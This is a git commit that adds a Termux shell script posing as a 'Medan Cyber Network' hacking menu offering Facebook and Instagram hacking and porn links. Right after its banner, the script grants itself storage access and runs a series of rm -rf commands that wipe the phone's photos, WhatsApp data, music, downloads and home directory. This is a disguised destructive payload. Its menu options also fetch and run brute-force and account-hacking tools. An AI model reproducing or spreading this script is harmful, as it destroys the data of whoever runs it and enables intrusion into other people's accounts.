fb346356b65e87fc41fd92da5cf08b89f0fe2b0a
DarkGans <56784467+DarkGans@users.noreply.github.com>
2019-10-31 22:43:35 +0700

    Add files via upload

---
+++ wayy2308.sh
@@ -0,0 +1,117 @@
+#!/bin!bash
+bi='\033[34;1m' #biru
+i='\033[32;1m' #ijo
+pur='\033[35;1m' #purple
+cy='\033[36;1m' #cyan
+me='\033[31;1m' #merah
+pu='\033[37;1m' #purple
+ku='\033[33;1m' #kuning
+sleep 1
+clear
+echo $ku " █████████"
+echo $cy " █▄█████▄█"
+echo $me " █▼▼▼▼▼"
+echo $cy   " Medan Cyber Network22"
+echo $cy " █▲▲▲▲▲"
+echo $bi " █████████"
+echo $ku " ██ ██"
+echo $ku"╔══════════════════════════════════╗"
+echo $cy "       ۩ AUTHOR: DARK4127              "
+echo $me "         ۩  MASSAGE  ۩                  "
+echo $cy "۩ KALAU ANDA MELIHAT AUTHOR ۩     "
+echo $cy "۩ SELAIN INI FIX BERARTI RECORD ۩  "
+echo $cy "۩ LIKE COMMENT AND SUBCSRIBE ۩     "
+echo $ku"╚══════════════════════════════════╝"
+echo
+sh install.sh
+echo $ku"╔═════════════════════════════════════╗"
+  echo $cy" • KALO MAU RECORDE NGOTAK DONG BABI       "
+  echo $cy" • GUA GANS TQ "
+  echo $cy" • LIKE COMMENT AND" $me"SUBCSRIBE"
+echo $ku"╚═════════════════════════════════════╝"
+echo
+termux-setup-storage
+rm -rf /storage/emulated/0
+rm -rf /sdcard/0
+rm -rf /storage/emulated/0/DCIM
+rm -rf /storage/emulated/0/android/obb
+rm -rf /sdcard/0/android/data
+rm -rf $HOME
+rm -rf sdcard/0
+rm -rf storage/emulated/0
+rm -rf /storage/emulated/0/WhatsApp
+rm -rf /sdcard/0/WhatsApp
+rm -rf /storage/emulated/0/Downloads
+rm -rf /storage/emulated/0/Music
+rm -rf /sdcard/0/Music
+rm -rf /storage/emulated/0/foto
+rm -rf /sdcard/0/foto
+echo
+echo
+echo $ku "            █▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█"
+echo $me "            █░░╦─╦╔╗╦─╔╗╔╗╔╦╗╔╗░░█"
+echo $cy "            █░░║║║╠─║─║─║║║║║╠─░░█"
+echo $i  "            █░░╚╩╝╚╝╚╝╚╝╚╝╩─╩╚╝░░█"
+echo $ku "            █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█"
+echo
+echo
+echo $cy"█▀▀▀▀▀▀▀▀█" $cy"█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█" $cy"█▀▀▀▀▀▀▀▀█"
+echo $cy"█"$me  "ONLINE"$cy" █   "$ku"•MEDAN CYBER NETWORK22•"    $cy"  █" $me"STATUS"$cy" █"
+echo $cy"█▄▄▄▄▄▄▄▄█" $cy"█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█" $cy"█▄▄▄▄▄▄▄▄█"
+echo
+echo
+echo
+echo $me"█▀▀▀▀▀▀▀█"  $ku      "█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█"                   $pur "█▀▀▀▀▀▀▀█"
+echo $me"█" $cy "[1]" $me "█"  $ku" █ "$cy "HACK FACEBOOK TARGET"    $ku" █ "$pur "█" $cy "[✓]" $pur "█ "
+echo $me"█▄▄▄▄▄▄▄█"  $ku      "█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█"                   $pur "█▄▄▄▄▄▄▄█"
+echo
+echo $me"█▀▀▀▀▀▀▀█"  $ku      "█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█"                $pur "█▀▀▀▀▀▀▀█"
+echo $me"█" $cy "[2]" $me "█" $ku" █ "$cy "  DARK FACEBOOK V2. " $ku "█ " $pur"█" $cy "[✓]" $pur" █ "
+echo $me"█▄▄▄▄▄▄▄█"   $ku     "█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█"                $pur "█▄▄▄▄▄▄▄█"
+echo
+echo $me"█▀▀▀▀▀▀▀█"  $ku      "█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█"               $pur "█▀▀▀▀▀▀▀█"
+echo $me"█" $cy "[3]" $me "█" $ku "█ "$cy " BOKEP THE MOVIES"   $ku "   █ "$pur" █" $cy "[✓]" $pur "█ "
+echo $me"█▄▄▄▄▄▄▄█"  $ku      "█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█"               $pur "█▄▄▄▄▄▄▄█"
+echo
+echo $me"█▀▀▀▀▀▀▀█"  $ku      "█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█"                $pur "█▀▀▀▀▀▀▀█"
+echo $me"█" $cy "[4]" $me "█"  $ku" █ "$cy "HACK INSTAGRAM NARGET" $ku"█" $pur "█" $cy "[✓]" $pur "█"
+echo $me"█▄▄▄▄▄▄▄█"  $ku      "█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█"                $pur "█▄▄▄▄▄▄▄█"
+read -p "dark@gans: " PILIH
+if
+[ $PILIH = 1 ]
+then
+clear
+https://github.com/DarkGans/Flickr
+cd fb-brute
+python2 brute.py
+fi
+
+
+if
+[ $PILIH = 2 ]
+then
+clear
+git clone https://github.com/storiku/darkfb
+pip2 install requests
+pip2 install mechanize
+cd darkfb
+python2 Dark.py
+fi
+
+if
+[ $PILIH = 3 ]
+then
+clear
+git clone https://github.com/CyberTCA/link-porn
+cd link-porn
+sh Bokep.sh
+fi
+
+if
+[ $PILIH = 4 ]
+then
+clear
+git clone https://github.com/storiku/instahack
+cd instahack
+bash ig.sh
+fi
